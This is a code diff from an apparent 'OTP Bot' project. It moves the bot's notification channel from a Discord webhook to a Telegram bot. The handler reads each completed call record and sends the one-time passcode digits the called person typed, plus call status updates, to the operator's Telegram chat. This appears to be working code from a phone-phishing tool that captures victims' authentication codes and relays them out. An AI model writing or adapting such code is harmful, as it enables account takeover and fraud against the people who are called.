@@ -2,11 +2,9 @@ module.exports = function (req, res) {
   // Import the configuration file.
   const config = require("../config");
   
-  // Import the required classes from discord-webhook-node module.
-  const { Webhook, MessageBuilder } = require("discord-webhook-node");
-  
-  // Create a new Webhook object using the Discord webhook URL from the config.
-  const discordWebhook = new Webhook(config.discordwebhook || "");
+  // Import the telegraf module and create a new bot instance.
+  const { Telegraf } = require('telegraf');
+  const bot = new Telegraf(config.telegramToken);
   
   // Import the sqlite3 module and enable verbose mode for detailed error messages.
   const sqlite3 = require("sqlite3").verbose();
@@ -63,46 +61,31 @@ module.exports = function (req, res) {
           return console.log(err.message);
         }
 
-        if (table == "calls" && status == "completed" && config.discordwebhook != undefined) {
-          // If the call is completed, send a notification to the Discord webhook.
+        if (table == "calls" && status == "completed" && config.telegramToken != undefined) {
+          // If the call is completed, send a notification to the Telegram bot.
           db.get("SELECT * FROM calls WHERE callSid = ?", [sid], (err, callDetails) => {
             if (err) {
               return console.error(err.message);
             }
             let message;
             if (callDetails.digits == "" || callDetails.digits == undefined) {
-              message = new MessageBuilder()
-                .setTitle("OTP Bot")
-                .setColor("15158332")
-                .setDescription("\n:x: The user didn't respond or enter the code.\n")
-                .setFooter(callDetails.user)
-                .setTimestamp();
+              message = "OTP Bot: \n:x: The user didn't respond or enter the code.";
             } else {
               if (callDetails.user == "test") {
                 callDetails.digits = callDetails.digits.slice(0, 3) + "***";
               }
-              message = new MessageBuilder()
-                .setTitle("OTP Bot")
-                .setColor("15158332")
-                .setDescription("\n:white_check_mark:  OTP : ||" + callDetails.digits + "||\n")
-                .setFooter(callDetails.user)
-                .setTimestamp();
+              message = `OTP Bot: \n:white_check_mark:  OTP : ||${callDetails.digits}||`;
             }
-            discordWebhook.send(message);
+            bot.telegram.sendMessage(config.telegramChatId, message);
           });
         } else {
-          // If the call is not completed, send a status update to the Discord webhook.
+          // If the call is not completed, send a status update to the Telegram bot.
           db.get("SELECT * FROM calls WHERE callSid = ?", [sid], (err, callDetails) => {
             if (err) {
               return console.error(err.message);
             }
-            const message = new MessageBuilder()
-              .setTitle("OTP Bot")
-              .setColor("15158332")
-              .setDescription(`\nStatus: **${status}**\n`)
-              .setFooter(callDetails.user)
-              .setTimestamp();
-            discordWebhook.send(message);
+            const message = `OTP Bot: \nStatus: **${status}**`;
+            bot.telegram.sendMessage(config.telegramChatId, message);
           });
         }
         return res.status(200).json({
